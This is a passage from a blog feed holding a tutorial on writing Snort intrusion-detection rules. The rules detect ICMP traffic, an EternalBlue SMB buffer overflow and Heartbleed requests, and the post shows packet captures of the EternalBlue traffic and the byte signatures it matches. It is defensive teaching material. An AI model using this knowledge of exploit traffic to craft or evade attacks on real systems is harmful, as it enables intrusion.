&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="picogym" /><category term="ctf" /><category term="web" /><summary type="html">Description</summary></entry><entry><title type="html">Traffic Analysis with Snort</title><link href="https://jayngng.github.io/blog/snort-packet-inspector/" rel="alternate" type="text/html" title="Traffic Analysis with Snort" /><published>2021-09-14T05:40:23+10:00</published><updated>2021-09-14T05:40:23+10:00</updated><id>https://jayngng.github.io/blog/snort---packet-inspector</id><content type="html" xml:base="https://jayngng.github.io/blog/snort-packet-inspector/">&lt;h2 id=&quot;overview&quot;&gt;&lt;strong&gt;Overview&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this post, we will focus on writing Snort rules to detect real-world attacks based on inspecting and analyzing malicious traffic.&lt;/p&gt;

&lt;h5 id=&quot;tools-used&quot;&gt;&lt;strong&gt;Tools used&lt;/strong&gt;:&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;introduction-to-snort&quot;&gt;&lt;strong&gt;Introduction to Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Snort is an open source &lt;strong&gt;IDS&lt;/strong&gt; and &lt;strong&gt;IPS&lt;/strong&gt;, it can be used as &lt;strong&gt;packet sniffer&lt;/strong&gt; or &lt;strong&gt;packet logger&lt;/strong&gt;. With a set of rules, Snort can inspect all traffic and link malicious traffic that match the rules. Depending on the rule, Snort is able to prevent or log the traffic.&lt;/p&gt;

&lt;p&gt;Another powerful function of Snort is &lt;strong&gt;custom rules&lt;/strong&gt;. Primarily, those rules allow users to monitor traffic in a more flexible way.&lt;/p&gt;

&lt;p&gt;Let’s us see how to create custom rules in the next sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;detect-icmp-request--reply-with-snort&quot;&gt;&lt;strong&gt;Detect ICMP request &amp;amp; reply with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We start with locating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local.rules&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate local.rules
/etc/nsm/rules/local.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local.rules&lt;/code&gt; file is a compilation of custom rules, where we’ll utilize to write our own rules.&lt;/p&gt;

&lt;p&gt;Generally, our rule will look like the following:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/rule_overview.png&quot; title=&quot;snort/rule_overview.png&quot; alt=&quot;snort/rule_overview.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It’s very simple to detect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICMP request or reply&lt;/code&gt;. By default, Snort offers the ability to parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icmp&lt;/code&gt; protocol in Snort rule.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert icmp any any -&amp;gt; 192.168.1.0/24 any (msg:&quot;ICMP detect!&quot;; sid:10000001; rev:1;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s apply the rule against a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icmp.pcap&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; icmp.pcap
02/21-22:25:18.329311  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 213.16.246.5 -&amp;gt; 192.168.1.2
02/21-22:25:20.717067  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:20.717109  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:21.395044  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:21.722816  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:21.722845  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:22.729727  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:22.729760  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Just like that, we successfully detect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICMP&lt;/code&gt; packets.&lt;/p&gt;

&lt;h4 id=&quot;detect-buffer-overflow-attack-with-snort&quot;&gt;&lt;strong&gt;Detect Buffer Overflow attack with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Typically, a &lt;strong&gt;Buffer Overflow&lt;/strong&gt; attack will contain a large number of “A” letters.&lt;/p&gt;

&lt;p&gt;Let’s us see that in action utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-nntttt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; eternalblue.pcap &lt;span class=&quot;s2&quot;&gt;&quot;port 445 and src 192.168.1.6 and greater 1000&quot;&lt;/span&gt;
...
2019-02-22 17:13:34.451071 IP 192.168.1.6.55018 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.1.4.445: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2112:6268, ack 40, win 237, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nop,nop,TS val 325529 ecr 38791], length 4156                         
E..p..@.@.%....................&lt;span class=&quot;nv&quot;&gt;$.&lt;/span&gt;..........                                                                                                                                                   
...........8.SMB3......H....................    ............8.................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
.................................................................................................................................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, we can also find the same traffic.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/eternal.png&quot; title=&quot;snort/eternal.png&quot; alt=&quot;snort/eternal.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;→ There is a high possibility of attacker mounted an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Eternal Blue BoF&lt;/code&gt; exploit against a SMB service.&lt;/p&gt;

&lt;p&gt;Generally, the rule is written based on the following characteristics in the traffic:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Destination port: 445.&lt;/li&gt;
  &lt;li&gt;Content: lots of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; letters.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; 192.168.1.0/24 445 (msg:&quot;Possible Eternal Blue BoF detect!&quot;; content:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;; sid:10000002; rev:3;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort&lt;/code&gt; against the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eternal.pcap&lt;/code&gt; traffic, we’re able to detect the BoF attack.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; eternalblue.pcap &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; none
...
02/22-22:13:34.463024  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.463414  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.487892  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
02/22-22:13:34.488099  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000002:3] Possible Eternal Blue BoF detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6:55018 -&amp;gt; 192.168.1.4:445
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt; is to disable checksum.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;detect-heartbleed-with-snort&quot;&gt;&lt;strong&gt;Detect Heartbleed with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hearbleed&lt;/code&gt; is generally an attack sending a crafted payload with the &lt;strong&gt;payload length&lt;/strong&gt; &amp;gt; &lt;strong&gt;actual payload length&lt;/strong&gt; for a purpose of leaking memory data.&lt;/p&gt;

&lt;p&gt;It’s worth noticing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbleed&lt;/code&gt; doesn’t have a specific pattern as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Eternal Blue&lt;/code&gt; we saw previously. However, to mount the attack, the communication protocols mainly used are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbeat Request/Response&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/heartbeat_req.png&quot; title=&quot;snort/heartbeat_req.png&quot; alt=&quot;snort/heartbeat_req.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;This is also where the data is leaked.&lt;/p&gt;

&lt;p&gt;Let’s us further analyze the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hearbeat Message (Request)&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/hb_req.png&quot; title=&quot;snort/hb_req.png&quot; alt=&quot;snort/hb_req.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The output demonstrates two important information:&lt;/p&gt;

&lt;p&gt;→ &lt;strong&gt;&lt;em&gt;The actual length of payload is&lt;/em&gt;&lt;/strong&gt;: 0 byte&lt;/p&gt;

&lt;p&gt;→ &lt;strong&gt;&lt;em&gt;The crafted length is&lt;/em&gt;&lt;/strong&gt;: 16386 bytes&lt;/p&gt;

&lt;p&gt;Therefore, the packet is spotted as abnormality.&lt;/p&gt;

&lt;p&gt;Now, to write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbleed&lt;/code&gt; rule, we might rely on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heartbeat&lt;/code&gt; protocol and the port 443.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/hb_hex.png&quot; title=&quot;snort/hb_hex.png&quot; alt=&quot;snort/hb_hex.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;More explanations of the above image:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Color&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Hex&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Meaning&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Yello&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;Content-Type: Heartbeat&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Red&lt;/td&gt;
      &lt;td&gt;03 02 00&lt;/td&gt;
      &lt;td&gt;Version: TLS 1.1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Putting everything together, our Snort rule is:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; 172.16.121.0/24 443 (msg:&quot;Possible Heartbleed detect!&quot;; content:&quot;|18 03 02 00|&quot;; rawbytes;sid:10000003; rev:1;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Applying the rule against the traffic, we successfully expose the attack.&lt;/p&gt;

